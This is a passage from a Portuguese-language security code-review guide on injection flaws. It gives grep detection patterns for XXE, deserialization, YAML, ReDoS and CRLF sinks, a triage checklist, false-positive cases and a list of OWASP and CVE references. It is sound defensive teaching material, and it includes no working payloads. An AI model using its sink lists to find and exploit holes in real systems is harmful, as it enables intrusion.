| XXE | Python | `etree.parse`, `minidom.parse` sem `defusedxml` | `grep -rnE 'from xml\.\|etree\.(parse\|fromstring)' .` |
| XXE | PHP | `LIBXML_NOENT`, `simplexml_load_*` | `grep -rn 'LIBXML_NOENT' .` |
| YAML | Node/Python/Java | `DEFAULT_FULL_SCHEMA`, `yaml.load(` sem safe, `new Yaml()` | `grep -rnE 'yaml\.load\(\|DEFAULT_FULL_SCHEMA\|UnsafeLoader\|FullLoader\|new Yaml\(\)' .` |
| Desserialização | Java | `readObject`, `XMLDecoder`, `enableDefaultTyping` | `grep -rnE 'ObjectInputStream\|readObject\(\|XMLDecoder\|enableDefaultTyping\|@JsonTypeInfo' .` |
| Desserialização | PHP/Python/.NET | `unserialize(`, `pickle.loads`, `BinaryFormatter`, `TypeNameHandling` | `grep -rnE 'unserialize\(\|pickle\.loads\?\|BinaryFormatter\|TypeNameHandling' .` |
| Prototype poll. | Node | merges recursivos, `for..in`, `lodash.merge/set` | veja §9.5 |
| ReDoS | qualquer | quantificador aninhado | `grep -rnE '\([^)]*[+*]\)[+*]' src/` (ruidoso — triar) |
| CSV | Node | montagem de CSV sem prefixo defensivo | `grep -rniE 'csv\|\.join\(","\)\|stringify.*csv' src/` |
| CRLF | Node | `setHeader` com variável, `Location:` montado | `grep -rnE 'setHeader\(\|writeHead\(\|Location.*\$\{' src/` |
| LDAP/XPath | qualquer | filtro/expressão concatenada | `grep -rnE 'SearchControls\|ldapjs\|xpath\|selectNodes' .` |

### 11.2 Semgrep e SAST

Regras públicas úteis, por ruleset: `p/owasp-top-ten`, `p/javascript`, `p/nodejsscan`, `p/gitleaks` (fora do escopo aqui) e as regras `javascript.lang.security.audit.*` (que cobrem `eval`, `child_process`, `vm`) e `javascript.express.security.*`. Para prototype pollution especificamente, o CodeQL `js/prototype-pollution` e `js/prototype-polluting-assignment` têm precisão melhor do que regex, porque fazem taint tracking do request até o merge. Combine SAST com uma revisão manual dos hits: em injeção, o que determina se é bug é a **origem** do dado, e a origem é justamente o que a regra por padrão erra mais.

Detalhes de configuração de ferramentas em `references/ferramentas.md`.

### 11.3 Roteiro de triagem de um achado

1. **Qual é o sink exato?** (função e linha)
2. **A variável que chega no sink vem de onde?** Rastreie até uma fonte externa: `req.*`, header, cookie, mensagem de fila, webhook, arquivo enviado, **coluna do banco** (segunda ordem), variável de ambiente controlável, resposta de serviço de terceiro.
3. **Existe parametrização/canal separado entre a fonte e o sink?** Se sim, não é injeção — pode ser outra coisa (autorização, DoS).
4. **Que barreira existe no caminho?** Schema Zod que força `string().uuid()` derruba o achado. Um `replace(/'/g,"''")` **não** derruba: anote como mitigação frágil.
5. **Qual é o impacto real?** Leitura de uma tabela vs. RCE muda a severidade em várias faixas (critérios em `references/threat-modeling-e-severidade.md`).
6. **Prove com o mínimo necessário.** Um `sleep` de 5 s ou uma diferença booleana confirmada duas vezes basta; não é preciso dumpar dado de produção.

---

## 12. Falsos positivos comuns

Casos que **parecem** injeção e não são. Marcar isso corretamente é tão importante quanto achar o bug — relatório com FP queima a confiança no resto.

- **SQL montado só com literais do próprio código.** `db.query('SELECT * FROM ' + TABLE_NAME)` onde `TABLE_NAME` é uma constante do módulo. Não há fonte externa. Idem para query montada a partir de um `enum` do TypeScript ou de um mapa fixo.
- **`$queryRawUnsafe` com placeholders posicionais.** `$queryRawUnsafe('SELECT * FROM u WHERE id = $1', id)` é seguro — "Unsafe" refere-se ao fato de a **string** não ser um tagged template, não a ausência de binding. O bug é a interpolação, não o nome do método.
- **`knex.raw('?? = ?', [col, val])` com `col` vindo de allowlist.** Se `col` é resultado de um mapa fixo, está correto.
- **`sql.identifier()` / `.as()` com constante.** O CVE-2026-39356 do Drizzle só afeta identificador vindo de **input em runtime**. Alias fixo no código não é afetado.
- **`exec()` com comando totalmente literal.** `exec('git rev-parse HEAD')` sem nenhuma interpolação não é command injection. Se houver `${}` no template, olhe de novo.
- **`eval` sobre string gerada pelo próprio programa** (build step, macro de codegen que roda em CI a partir de arquivos do repositório). O risco aí é supply chain, não injeção de request — reclassifique e mande para `references/supply-chain-e-cicd.md`.
- **`JSON.parse(req.body)` sem merge posterior.** Não é prototype pollution. O `__proto__` fica como propriedade própria e some no primeiro `zodSchema.parse`. Só vira bug se houver `Object.assign`, `merge`, `for..in` ou escrita dinâmica depois.
- **`Object.assign(target, source)` raso onde `source` é o resultado de um schema Zod com `.strict()`.** Chave desconhecida já foi rejeitada.
- **Prototype pollution "detectada" em dependência de dev/build** (`devDependencies` que só roda em CI, com input do próprio repositório). Severidade baixa; não é vetor remoto.
- **ReDoS em regex aplicada a constante ou a valor de tamanho já limitado.** `if (s.length > 64) return false` antes do match neutraliza a explosão exponencial na prática. Verifique se o limite vem **antes**.
- **XXE reportado por scanner em parser que já está com `disallow-doctype-decl`.** Muitos scanners olham só a chamada `newInstance()` e não as linhas seguintes.
- **`yaml.load` do js-yaml v4.** É seguro por padrão. Só é achado com `schema: DEFAULT_FULL_SCHEMA`, com `js-yaml@3`, ou com um `Loader` customizado que registre tipos que constroem função.
- **`child_process.spawn` com `shell: false`** (default) e argumentos vindos de allowlist. Não é command injection. **Mas** revise argument injection separadamente: se um argumento pode começar com `-`, o achado é CWE-88, não CWE-78 — e é achado de verdade.
- **Desserialização de formato nativo com payload assinado por HMAC verificado antes**, com a chave em KMS e rotacionada. Reduza a severidade e registre a dependência da chave como risco arquitetural, não como vulnerabilidade explorável hoje.
- **`$where`/`$function` no Mongo com `security.javascriptEnabled: false` confirmado no cluster.** Confirme lendo a configuração, não presumindo.
- **Endpoint interno sem autenticação atrás de mTLS/malha de serviço**, onde a query é montada a partir de dado de outro serviço confiável. Ainda vale anotar como defesa em profundidade ausente, mas não como injeção explorável — a menos que aquele serviço a montante repasse input de usuário (o que é o caso mais frequente; verifique antes de descartar).

---

## Fontes

**OWASP**
- [OWASP Top 10:2025](https://owasp.org/Top10/2025/) — Injection é A05:2025
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)
- [OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)
- [Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [OWASP WSTG — Testing for Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)
- [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

**PortSwigger Web Security Academy**
- [SQL injection](https://portswigger.net/web-security/sql-injection) e [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [NoSQL injection](https://portswigger.net/web-security/nosql-injection)
- [OS command injection](https://portswigger.net/web-security/os-command-injection)
- [Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [XXE injection](https://portswigger.net/web-security/xxe)
- [Server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side)

**Docs oficiais**
- [Prisma — Raw queries](https://www.prisma.io/docs/orm/prisma-client/using-raw-sql/raw-queries)
- [Drizzle — `sql` template tag](https://orm.drizzle.team/docs/sql)
- [Knex — Raw e bindings `?`/`??`](https://knexjs.org/guide/raw)
- [Node.js — `child_process`](https://nodejs.org/api/child_process.html) e [`vm` (não é sandbox de segurança)](https://nodejs.org/api/vm.html)
- [Node.js CLI — `--disable-proto`](https://nodejs.org/api/cli.html#--disable-protomode)
- [Mongoose — `sanitizeFilter`](https://mongoosejs.com/docs/api/mongoose.html)
- [Java Serialization Filters (JDK 21)](https://docs.oracle.com/en/java/javase/21/core/java-serialization-filters.html) e [JEP 290](https://openjdk.org/jeps/290)
- [BinaryFormatter removido do .NET 9](https://devblogs.microsoft.com/dotnet/binaryformatter-removed-from-dotnet-9/) e [SYSLIB0011](https://learn.microsoft.com/en-us/dotnet/fundamentals/syslib-diagnostics/syslib0011)
- [defusedxml](https://pypi.org/project/defusedxml/)

**CVEs e advisories citados**
- [CVE-2026-39356 — Drizzle ORM, SQL injection por identificador](https://github.com/drizzle-team/drizzle-orm/security/advisories/GHSA-gpj5-g38j-94v9) (patch 0.45.2 / 1.0.0-beta.20)
- [CVE-2026-42334 — Mongoose, bypass de `sanitizeFilter` via `$nor`](https://github.com/Automattic/mongoose/security/advisories/GHSA-wpg9-53fq-2r8h) (patch 6.13.9 / 7.8.9 / 8.22.1 / 9.1.6)
- [CVE-2026-4631 — Cockpit, RCE não autenticada por argument injection no SSH](https://www.openwall.com/lists/oss-security/2026/04/10/5)
- [CVE-2022-24999 — qs / Express, prototype pollution](https://github.com/advisories/GHSA-hrpp-h998-j3pp)
- [CVE-2019-10744](https://github.com/advisories/GHSA-jf85-cpcp-j695) e [CVE-2020-8203](https://github.com/advisories/GHSA-p6mc-m468-83gw) — lodash
- [CVE-2022-29078 — EJS RCE via prototype pollution de `outputFunctionName`](https://nvd.nist.gov/vuln/detail/CVE-2022-29078)
- [CVE-2021-44228 — Log4Shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [CVE-2017-5638 — Struts S2-045 / OGNL](https://nvd.nist.gov/vuln/detail/CVE-2017-5638) e [CVE-2024-53677 — análise técnica](https://www.dynatrace.com/news/blog/the-anatomy-of-broken-apache-struts-2-a-technical-deep-dive-into-cve-2024-53677/)
- [CVE-2024-24576 — "BatBadBut", quoting de argumento no Windows](https://nvd.nist.gov/vuln/detail/CVE-2024-24576)
- [CVE-2023-51385 — OpenSSH ProxyCommand](https://threatprotect.qualys.com/2023/12/26/ssh-proxycommand-unexpected-code-execution-vulnerability-cve-2023-51385/)

**CWE**
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html), [CWE-78](https://cwe.mitre.org/data/definitions/78.html), [CWE-88](https://cwe.mitre.org/data/definitions/88.html), [CWE-94](https://cwe.mitre.org/data/definitions/94.html), [CWE-1336](https://cwe.mitre.org/data/definitions/1336.html), [CWE-611](https://cwe.mitre.org/data/definitions/611.html), [CWE-502](https://cwe.mitre.org/data/definitions/502.html), [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html), [CWE-90](https://cwe.mitre.org/data/definitions/90.html), [CWE-643](https://cwe.mitre.org/data/definitions/643.html), [CWE-1236](https://cwe.mitre.org/data/definitions/1236.html), [CWE-93](https://cwe.mitre.org/data/definitions/93.html), [CWE-117](https://cwe.mitre.org/data/definitions/117.html), [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html), [CWE-943](https://cwe.mitre.org/data/definitions/943.html)
